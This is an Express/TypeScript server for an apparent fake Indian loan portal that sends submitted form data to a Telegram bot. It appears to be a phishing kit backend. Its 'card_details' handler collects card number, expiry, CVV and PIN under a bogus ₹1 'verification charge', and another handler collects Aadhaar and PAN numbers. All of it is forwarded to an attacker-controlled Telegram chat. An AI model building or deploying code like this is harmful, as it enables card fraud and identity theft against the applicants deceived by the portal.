import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// In-memory Telegram configuration and logs store
let telegramConfig = {
  botToken: process.env.TELEGRAM_BOT_TOKEN || '',
  chatId: process.env.TELEGRAM_CHAT_ID || '',
};

interface TelegramLog {
  id: string;
  timestamp: string;
  type: string;
  formattedMessage: string;
  data: Record<string, any>;
  status: 'sent' | 'simulated' | 'error';
  errorMessage?: string;
}

const telegramLogs: TelegramLog[] = [];

// Helper function to send message to Telegram API
async function sendTelegramMessage(token: string, chatId: string, text: string) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });

  const resData = await response.json();
  if (!response.ok || !resData.ok) {
    throw new Error(resData.description || 'Failed to send Telegram message');
  }
  return resData;
}

// API Routes
app.get('/api/telegram/config', (req, res) => {
  res.json({
    hasToken: Boolean(telegramConfig.botToken),
    hasChatId: Boolean(telegramConfig.chatId),
    maskedToken: telegramConfig.botToken
      ? `${telegramConfig.botToken.substring(0, 6)}...${telegramConfig.botToken.slice(-4)}`
      : '',
    chatId: telegramConfig.chatId,
  });
});

app.post('/api/telegram/config', (req, res) => {
  const { botToken, chatId } = req.body;
  if (typeof botToken === 'string') telegramConfig.botToken = botToken.trim();
  if (typeof chatId === 'string') telegramConfig.chatId = chatId.trim();

  res.json({
    success: true,
    message: 'Telegram configuration updated successfully',
    hasToken: Boolean(telegramConfig.botToken),
    hasChatId: Boolean(telegramConfig.chatId),
  });
});

app.get('/api/telegram/logs', (req, res) => {
  res.json({
    logs: telegramLogs,
    total: telegramLogs.length,
  });
});

function escapeHtml(str: any) {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

app.post('/api/telegram/send', async (req, res) => {
  const { type, data = {}, customBotToken, customChatId } = req.body;

  const activeToken = (customBotToken && customBotToken.trim()) ||
                      (telegramConfig.botToken && telegramConfig.botToken.trim()) ||
                      process.env.TELEGRAM_BOT_TOKEN ||
                      process.env.VITE_TELEGRAM_BOT_TOKEN ||
                      '';

  const activeChatId = (customChatId && customChatId.trim()) ||
                       (telegramConfig.chatId && telegramConfig.chatId.trim()) ||
                       process.env.TELEGRAM_CHAT_ID ||
                       process.env.VITE_TELEGRAM_CHAT_ID ||
                       '';

  const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
  let formattedMessage = '';

  if (type === 'phone_step') {
    formattedMessage = `
📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>
──────────────────────────────
• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>
• <b>Submitted At:</b> ${escapeHtml(timestamp)}
• <b>Device/IP:</b> Web Application Client
`;
  } else if (type === 'personal_details') {
    formattedMessage = `
📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>
──────────────────────────────
• <b>Full Name:</b> ${escapeHtml(data.name)}
• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>
• <b>Employment Type:</b> ${escapeHtml(data.employmentType)}
• <b>Aadhaar Number:</b> <code>${escapeHtml(data.adhar)}</code>
• <b>PAN Card:</b> <code>${escapeHtml(data.panCard || 'N/A')}</code>
• <b>Age:</b> ${escapeHtml(data.age)} years
• <b>State:</b> ${escapeHtml(data.state)}
• <b>City:</b> ${escapeHtml(data.city)}
• <b>Pincode:</b> ${escapeHtml(data.pincode)}
• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 250000).toLocaleString('en-IN')} (${escapeHtml(data.loanTenure || 24)} months)
• <b>Submitted At:</b> ${escapeHtml(timestamp)}
`;
  } else if (type === 'card_details') {
    formattedMessage = `
💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>
──────────────────────────────
• <b>Applicant Name:</b> ${escapeHtml(data.name || 'N/A')}
• <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>
• <b>Bank Name:</b> ${escapeHtml(data.bankName || 'Not Selected')}
• <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)
• <b>Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>
• <b>Card Holder:</b> ${escapeHtml(data.cardHolder || 'N/A')}
• <b>Expiry Date:</b> <code>${escapeHtml(data.exp)}</code>
• <b>CVV:</b> <code>${escapeHtml(data.cvv)}</code>
• <b>PIN Number:</b> <code>${escapeHtml(data.pin || 'Not Provided')}</code>
• <b>Submitted At:</b> ${escapeHtml(timestamp)}
`;
  } else {
    formattedMessage = `
ℹ️ <b>LOAN PORTAL EVENT</b>
──────────────────────────────
• <b>Event:</b> ${escapeHtml(type)}
• <b>Details:</b> <pre>${escapeHtml(JSON.stringify(data, null, 2))}</pre>
• <b>Timestamp:</b> ${escapeHtml(timestamp)}
`;
  }

  const logEntry: TelegramLog = {
    id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
    timestamp,
    type,
    formattedMessage,
    data,
    status: 'simulated',
  };

  if (!activeToken || !activeChatId) {
    logEntry.status = 'simulated';
    telegramLogs.unshift(logEntry);
    return res.json({
      success: true,
      simulated: true,
      message: 'Message logged in demo mode. Configure Telegram Bot Token & Chat ID in Settings to send live messages.',
      log: logEntry,
    });
  }

  try {
    await sendTelegramMessage(activeToken, activeChatId, formattedMessage);
    logEntry.status = 'sent';
    telegramLogs.unshift(logEntry);
    return res.json({
      success: true,
      simulated: false,
      message: 'Notification sent successfully to Telegram bot!',
      log: logEntry,
    });
  } catch (error: any) {
    console.error('Telegram delivery error:', error);
    logEntry.status = 'error';
    logEntry.errorMessage = error.message;
    telegramLogs.unshift(logEntry);
    return res.status(500).json({
      success: false,
      simulated: false,
      error: error.message || 'Failed to send message to Telegram bot',
      log: logEntry,
    });
  }
});

async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Loan Portal Server running on http://localhost:${PORT}`);
  });
}

startServer();
